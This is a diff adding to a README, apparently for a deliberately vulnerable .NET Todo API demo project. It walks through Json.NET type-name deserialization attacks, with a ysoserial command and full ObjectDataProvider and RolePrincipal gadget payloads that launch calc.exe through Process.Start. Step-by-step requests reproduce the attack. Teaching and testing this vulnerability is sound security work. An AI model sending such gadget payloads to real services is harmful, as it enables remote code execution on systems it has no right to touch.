@@ -72,5 +72,109 @@ This produces:
 
 The `ObjectDataProvider` uses `System.Diagnostics.Process` to pass the command to the `Start` method.
 
-Use the JsonVulnerabilities.Test project `LaunchObjectDataProviderExploit` test case to observe the exploit in isolation.
+Use the JsonVulnerabilities.Test project `LaunchObjectDataProviderExploit` test case to observe the exploit in isolation. Note that this does not raise an exception and that calc.exe runs.
 
+Alternatively, generate a message to run calc.exe using the `RolePrincipal` with:
+
+``` powershell
+ysoserial.exe -f Json.Net -g RolePrincipal -o raw -c "calc"
+```
+
+This generates:
+
+``` json
+{
+  "$type": "System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a",
+  "System.Security.ClaimsPrincipal.Identities": "AAEAAAD////...lkZXI+Cw=="
+}
+```
+
+The message is serialization serialized to JSON and value of `System.Security.ClaimsPrincipal.Identities` is base64 encoded. The `RolePrincipal` uses the `BinaryFormatter` to deserialize after the JSON message is deserialized. Running the `LaunchRolePrincipalExploit` test case runs this exploit in isolation. Note that an exception is generated but calc.exe is still launched.
+
+## Reproducing the Exploit : Launch Calc
+
+1. Run the solution in Debug mode.
+
+1. Open the requests.http file in the Solution Items directory.
+
+1. Send the requests in order with the following labels:
+
+    | Label | Result |
+    | --- | --- |
+    | list all items | Returns an empty array. |
+    | create a new task | _walk dog_ task is added. Observe `isComplete` is `false` |
+    | update an existing task | sets `isComplete` property on _walk dog_ task to `true` |
+    | send benign binary data | creates a take named _walk fido_ and metadata that includes details about Fido |
+    | list all items | Returns _walk dog_ and _walk fido_ tasks |
+
+    These requests do not result in any errors or exploits. The last request returns:
+
+    ``` json
+    {
+    "$type": "System.Collections.Generic.SynchronizedCollection`1[[Todo.Models.TodoItem, Todo.Models]], System.ServiceModel",
+    "$values": 
+        [
+            {
+                "$type": "Todo.Models.TodoItem, Todo.Models",
+                "id": 0,
+                "name": "walk dog",
+                "isComplete": true,
+                "metadata": null
+            },
+            {
+                "$type": "Todo.Models.TodoItem, Todo.Models",
+                "id": 1,
+                "name": "walk fido",
+                "isComplete": false,
+                "metadata": 
+                {
+                    "$type": "System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.Object, mscorlib]], mscorlib",
+                    "fido": 
+                    {
+                        "$type": "Todo.Models.Dog, Todo.Models",
+                        "name": "Fido",
+                        "breed": "Golden Retriever",
+                        "owner": "John Doe"
+                    }
+                }
+            }
+        ]
+    }
+    ```
+
+1. Send the request labeled `send malicious ObjectDataProvider gadget`. Observe that this launches the Calculator app on Windows.
+
+    ``` json
+    {
+    "name": "pwn with ObjectDataProvider",
+    "metadata" : 
+        {
+            "fido": 
+            {
+                "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+                "MethodName":"Start",
+                "MethodParameters":{
+                    "$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                    "$values":["cmd","/ccalc"]
+                },
+                "ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}
+            }
+        }
+    }
+    ```
+
+1. Send the request labeled `send malicious RolePrincipal gadget`. Observe that this launches the Calculator app on Windows.
+
+    ``` json
+    {
+    "name": "pwn with RolePrincipal",
+    "metadata" : 
+    {
+        "fido": 
+        {
+        "$type": "System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a",
+        "System.Security.ClaimsPrincipal.Identities": "AAEAAAD...lkZXI+Cw=="
+        }
+    }
+    }
+    ```
